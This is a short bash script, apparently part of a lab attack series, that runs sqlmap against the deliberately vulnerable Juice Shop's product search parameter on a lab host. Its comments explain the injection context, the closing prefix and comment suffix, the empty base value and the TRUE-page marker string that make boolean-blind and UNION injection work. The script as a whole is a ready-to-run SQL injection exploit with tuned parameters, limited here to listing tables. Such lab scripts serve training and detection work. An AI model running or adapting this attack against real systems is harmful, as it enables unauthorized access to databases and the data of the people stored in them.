#!/bin/bash
# Attack 3: Automated SQL injection against Juice Shop's product search.
source /attacks/lib.sh
banner "Attack 3: SQL injection (sqlmap)" "T1190 Exploit Public-Facing Application"

require_lab_target victim-web

# The "q" parameter of /rest/products/search is injectable (SQLite). The app
# builds  ...WHERE ((name LIKE '%<q>%' OR ...) ...  so the payload must close
# with "'))" and comment out the rest with "--". With that prefix sqlmap finds
# boolean-blind and UNION injection. The base value is empty: with a word
# like "apple" the closed LIKE matches nothing, so TRUE and FALSE look alike.
# --string marks a TRUE page (a product name that only appears when the
# injected condition is true); sqlmap's automatic page comparison misses it. --tables proves the injection by listing
# the database tables; nothing is dumped or modified.
sqlmap \
  -u "http://victim-web/rest/products/search?q=" \
  -p q \
  --dbms=SQLite \
  --prefix="'))" --suffix="--" \
  --technique=BU \
  --string="Apple Juice" \
  --flush-session \
  --batch \
  --level 2 --risk 1 \
  --tables \
  --output-dir "$OUT/03-sqlmap" \
  | tee "$OUT/03-sqlmap.txt"
done_msg
